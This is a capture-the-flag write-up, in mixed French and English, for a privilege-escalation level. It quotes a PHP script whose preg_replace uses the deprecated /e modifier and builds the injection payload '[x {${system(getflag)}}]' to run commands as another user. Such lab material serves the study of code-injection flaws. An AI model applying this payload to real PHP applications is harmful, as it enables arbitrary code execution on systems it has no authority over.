1. Ls dans le home, presence d'un script php et d'un executable qui l'appelle

ce script a les permission de flag05, donc on veut injecter "getflag > car/tmp/flag06" dedans

#!/usr/bin/php
<?php
function y($m) { 
    $m = preg_replace("/\./", " x ", $m); 
    $m = preg_replace("/@/", " y", $m); 
    return $m; 
}

function x($y, $z) { 
    $a = file_get_contents($y); 
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
    $a = preg_replace("/\[/", "(", $a); 
    $a = preg_replace("/\]/", ")", $a); 
    return $a; 
}

$r = x($argv[1], $argv[2]); 
print $r;
?>


----

y function : 
replaces all [ with ( and ] with )

x function : 
Reads the contents of a file given by $y (the first CLI argument).
Old PHP feature: The /e modifier in preg_replace evaluates the replacement string as PHP code. This is deprecated and removed in PHP 7 for security reasons.
It looks for [x something] in the file and replaces it with the result of calling y("something").


2. The goal here is to exploit the /e code execution to make a call to the getflag command using the system function : system(getflag)


3. In order to execute this command, we need to embed it inside a code block, and inside this code block use a variable call to trigger an error that will display the flag

{${system(getflag)}}

4. we need to embed this exploitation inside the matching pattern search in the preg replace function so it gets matched and executed : 

[x {${system(getflag)}}]
